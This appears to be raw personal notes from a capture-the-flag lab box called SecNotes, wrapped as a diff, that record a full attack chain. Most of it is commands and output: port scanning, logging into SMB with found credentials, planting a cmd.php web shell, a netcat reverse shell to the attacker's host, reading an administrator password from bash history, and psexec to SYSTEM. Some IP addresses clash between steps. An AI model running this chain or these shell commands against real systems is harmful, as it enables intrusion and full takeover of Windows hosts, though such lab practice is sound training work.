@@ -1,0 +1,164 @@
+└─$ nmap -p- -sSCV 10.10.10.97 --min-rate 999 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-22 04:12 EDT
+Nmap scan report for 10.10.10.97
+Host is up (0.38s latency).
+Not shown: 65532 filtered tcp ports (no-response)
+PORT    STATE SERVICE    VERSION
+53/tcp  open  tcpwrapped
+80/tcp  open  tcpwrapped
+|_http-server-header: Microsoft-IIS/10.0
+445/tcp open  tcpwrapped
+
+
+tyler@secnotes.htb 
+
+
+http://10.10.10.161/change_pass.php?password=test123456&confirm_password=test123456&submit=submit http://10.10.16.5:8821/complete
+
+[~/Downloads]$ nc -nvlp 8821
+Listening on 0.0.0.0 8821
+Connection received on 10.10.10.97 63526
+GET /complete HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17134.228
+Host: 10.10.16.9:8821
+Connection: Keep-Alive
+
+
+
+
+
+
+
+\\secnotes.htb\new-site
+tyler / 92g!mA8BGjOirkL%OG*&
+//seems like smb dir
+
+└─$ netexec smb 10.10.10.97 -u tyler -p '92g!mA8BGjOirkL%OG*&' --shares
+SMB         10.10.10.97     445    SECNOTES         [*] Windows 10 / Server 2016 Build 17134 (name:SECNOTES) (domain:SECNOTES) (signing:False) (SMBv1:True)
+SMB         10.10.10.97     445    SECNOTES         [+] SECNOTES\tyler:92g!mA8BGjOirkL%OG*& 
+SMB         10.10.10.97     445    SECNOTES         [*] Enumerated shares
+SMB         10.10.10.97     445    SECNOTES         Share           Permissions     Remark
+SMB         10.10.10.97     445    SECNOTES         -----           -----------     ------
+SMB         10.10.10.97     445    SECNOTES         ADMIN$                          Remote Admin
+SMB         10.10.10.97     445    SECNOTES         C$                              Default share
+SMB         10.10.10.97     445    SECNOTES         IPC$            READ            Remote IPC
+SMB         10.10.10.97     445    SECNOTES         new-site        READ,WRITE   
+
+└─$ smbclient //10.10.10.97/new-site --user=tyler --password='92g!mA8BGjOirkL%OG*&'
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Mon Sep 22 07:27:56 2025
+  ..                                  D        0  Mon Sep 22 07:27:56 2025
+  iisstart.htm                        A      696  Thu Jun 21 11:26:03 2018
+  iisstart.png                        A    98757  Thu Jun 21 11:26:03 2018
+
+		7736063 blocks of size 4096. 3393550 blocks available
+smb: \> mget iisstart.htm
+Get file iisstart.htm? y
+getting file \iisstart.htm of size 696 as iisstart.htm (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
+smb: \> mget iisstart.png
+Get file iisstart.png? y
+
+smb: \> put cmd.php
+putting file cmd.php as \cmd.php (0.0 kb/s) (average 2.8 kb/s)
+
+http://10.10.10.97:8808/cmd.php?cmd=whoami
+
+http://10.10.10.97:8808/cmd.php?cmd=nc64.exe%2010.10.16.9%208821
+
+
+smb: \> put nc64.exe
+putting file nc64.exe as \nc64.exe (13.4 kb/s) (average 4.6 kb/s)
+smb: \> put nc.exe
+putting file nc.exe as \nc.exe (14.1 kb/s) (average 5.8 kb/s)
+
+http://10.10.10.97:8808/cmd.php?cmd=nc.exe%20-e%20cmd.exe%2010.10.16.9%20443
+
+[~/Downloads]$ nc -nvlp 8821         
+Listening on 0.0.0.0 8821
+Connection received on 10.10.10.97 56776
+Microsoft Windows [Version 10.0.17134.228]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\inetpub\new-site>whoami
+whoami
+secnotes\tyler
+C:\Users\tyler\Desktop>type user.txt
+type user.txt
+0482d68a05fa7fd
+
+
+Copy-Item -Path "Ubuntu.zip"  -Destination "\\10.10.16.10\share\"
+
+PS C:\Users\tyler\Desktop> type bash.lnk
+type bash.lnk
+LAF wZ��O�cV�	Ov(�O�	O�9P�OD �:i�+00?/C:\V1�LIWindows@	�_<L`"�LI.h3"�&WindowsZ1�L<System32B�_<L`"�L<.p�kTSystem32Z2�OLP� bash.exeB	�_<L<��LU.sY�SaYbash.exeK-JU�YoC:\Windows\System32\bash.exe"..\..\..\Windows\System32\bash.exeC:\Windows\System32�%Y
+                                                        �wNA��]N�D.�rQ~�Y`�XsecnotesxI<sAA^>a?Yo�:u�>'E/,xI<sAA^>a?Yo�:u�>'E/,=	�Y1SPS�0�UC%GoDsf"=dSystem32 (C:\Windows)?1SPS�SXF�L8C��"&~mIq/S-1-5-21-1791094074-1363918840-4199337083-1002c1SPS0�%��G���`Oz��%
+	bash.exe@EoZ��O
+                       �)
+                         Application@v(�O�	Oi1SPS�jc(=O�AOUDMC:\Windows\System32\bash.exe91SPS�mD-?pHH@.=xOhHA(�bP
+
+C:\>where /R C:\ bash.exe
+where /R C:\ bash.exe
+C:\Windows\System32\bash.exe
+C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
+
+C:\>C:\Windows\System32\bash.exe
+C:\Windows\System32\bash.exe
+
+mesg: ttyname failed: Inappropriate ioctl for device
+whoami
+root
+id  
+uid=0(root) gid=0(root) groups=0(root)
+cd C:\Users\Administrator\
+pwd
+-bash: line 5: cd: C:UsersAdministratorpwd: No such file or directory
+pwd
+/mnt/c
+
+root@SECNOTES:~# cat .bash_history
+cat .bash_history
+cd /mnt/c/
+ls
+cd Users/
+cd /
+cd ~
+ls
+pwd
+mkdir filesystem
+mount //127.0.0.1/c$ filesystem/
+sudo apt install cifs-utils
+mount //127.0.0.1/c$ filesystem/
+mount //127.0.0.1/c$ filesystem/ -o user=administrator
+cat /proc/filesystems
+sudo modprobe cifs
+smbclient
+apt install smbclient
+smbclient
+smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
+> .bash_history 
+less .bash_history
+
+└─$ evil-winrm -i 10.10.10.97 -u administrator -p 'u6!4ZwgwOM#^OBf#Nwnh'
+                                        
+Evil-WinRM shell v3.7
+//failed, since port 5985 is not open
+
+└─$ impacket-psexec administrator:'u6!4ZwgwOM#^OBf#Nwnh'@10.10.10.97
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on 10.10.10.97.....
+[*] Found writable share ADMIN$
+[*] Uploading file crQKUEEl.exe
+[*] Opening SVCManager on 10.10.10.97.....
+[*] Creating service kkRy on 10.10.10.97.....
+[*] Starting service kkRy.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17134.228]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\WINDOWS\system32> whoami
+nt authority\system
+
+//what is psexec what is smbexec
